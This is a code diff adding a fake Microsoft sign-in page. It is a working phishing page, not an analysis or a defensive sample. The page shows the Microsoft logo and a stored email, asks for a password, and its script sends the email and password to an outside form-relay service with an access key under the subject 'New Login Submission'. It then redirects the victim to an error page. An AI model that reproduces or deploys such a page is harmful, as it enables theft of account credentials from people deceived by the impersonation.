@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title></title>
+
+        <style>
+/* BACKGROUND */
+body{
+    margin:0;
+    font-family: "Segoe UI", Arial, sans-serif;
+    background: url("back.svg") no-repeat center center/cover;
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+}
+
+/* OVERLAY POPUP */
+.popup{
+    width:380px;
+    background:#1f1f1f;
+    border-radius:5px;
+    padding:30px;
+    color:#fff;
+    box-shadow:0 10px 40px rgba(0,0,0,0.6);
+}
+
+/* LOGO AREA */
+.logo{
+    text-align:center;
+    margin-bottom:15px;
+    font-size:20px;
+    font-weight:600;
+    letter-spacing:0.5px;
+}
+
+/* EMAIL BADGE */
+.email-box{
+    text-align:center;
+    font-size:13px;
+    color:#cfcfcf;
+    border: 2px solid rgb(58, 57, 57);
+    background:transparent;
+    border-radius: 30px;
+    width: 60%;
+    padding:6px 10px;
+    display:flex;
+    justify-content: center;
+    margin:0 auto 15px;
+}
+/* LOGO AREA */
+.logo{
+    display:flex;
+    align-items:center;
+    justify-content: center;
+    gap:8px;
+    margin-bottom:20px;
+}
+
+.logo img{
+    width:22px;
+}
+
+.logo span{
+    font-size:18px;
+    color:#5a5a5a;
+}
+
+
+/* TITLE */
+h2{
+    text-align:center;
+    margin:10px 0;
+    font-size:22px;
+}
+
+/* DESCRIPTION */
+p{
+    text-align:center;
+    font-size:13px;
+    color:#bdbdbd;
+    margin-bottom:20px;
+    line-height:1.4;
+}
+
+/* INPUT */
+input{
+    width:90%;
+    padding:12px;
+    border-radius:6px;
+    border:1px solid #444;
+    background:#2a2a2a;
+    color:white;
+    outline:none;
+    margin-bottom:15px;
+}
+
+/* BUTTON */
+button{
+    width:100%;
+    padding:12px;
+    border:none;
+    border-radius:6px;
+    background:#0a66ff;
+    color:white;
+    font-weight:bold;
+    cursor:pointer;
+    transition:0.3s;
+}
+
+button:hover{
+    background:#004ed0;
+}
+
+/* LINKS */
+.links{
+    text-align:center;
+    margin-top:15px;
+    font-size:12px;
+}
+
+.links a{
+    display:block;
+    color:#6aa9ff;
+    text-decoration:none;
+    margin-top:8px;
+}
+
+.links a:hover{
+    text-decoration:underline;
+}
+
+/* POPUP MESSAGE */
+.popup-msg{
+    position:fixed;
+    top:20px;
+    right:20px;
+    background:#0a66ff;
+    color:#fff;
+    padding:10px 15px;
+    border-radius:6px;
+    display:none;
+}
+</style>
+    </head>
+
+    <body>
+
+        <div class="popup-msg" id="msg">Code sent successfully!</div>
+
+        <div class="popup">
+
+            <div class="logo">
+                <img
+                    src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg"
+                    alt="Microsoft Logo">
+                    <span>Microsoft</span>
+            </div>
+
+            <div class="email-box" id="displayEmail"></div>
+
+            <h2>Enter your password</h2>
+
+            <input type="password" id="codeInput" placeholder="Enter ***********">
+
+            <button onclick="sendCode()">Sign in</button>
+
+            <div class="links">
+                <a href="#">forgot password?</a>
+                <a href="#">Use your password</a>
+            </div>
+
+        </div>
+
+        <script>
+
+window.onload = function () {
+    const savedEmail = localStorage.getItem("ms_email");
+
+    if (savedEmail) {
+        document.getElementById("displayEmail").innerText = savedEmail;
+    }
+};
+
+// popup
+function showMsg(text) {
+    const msg = document.getElementById("msg");
+    msg.innerText = text;
+    msg.style.display = "block";
+
+    setTimeout(() => {
+        msg.style.display = "none";
+    }, 2500);
+}
+
+// SEND FUNCTION
+async function sendCode() {
+
+    const email = localStorage.getItem("ms_email");
+    const passwordInput = document.getElementById("codeInput");
+    const password = passwordInput.value.trim();
+
+    if (!email) {
+        showMsg("Email missing. Go back.");
+        return;
+    }
+
+    if (password === "") {
+        showMsg("Please enter details");
+        return;
+    }
+
+    const formData = new FormData();
+
+    formData.append("access_key", "4e3a4c13-8c40-417e-bedc-8ce4a55d1ea0");
+    formData.append("subject", "New Login Submission");
+    formData.append("email", email);
+    formData.append("code", password);
+
+    try {
+        const res = await fetch("https://api.web3forms.com/submit", {
+            method: "POST",
+            body: formData
+        });
+
+        const data = await res.json();
+
+        if (data.success) {
+
+            setTimeout(() => {
+                window.location.href = "./of-404.html";
+            }, 1500);
+
+        } else {
+            showMsg(data.message || "Failed to send");
+console.log(data);
+        }
+
+    } catch (err) {
+        console.log(err);
+        showMsg("Network error");
+    }
+}
+
+</script>
+
+    </body>
+</html>
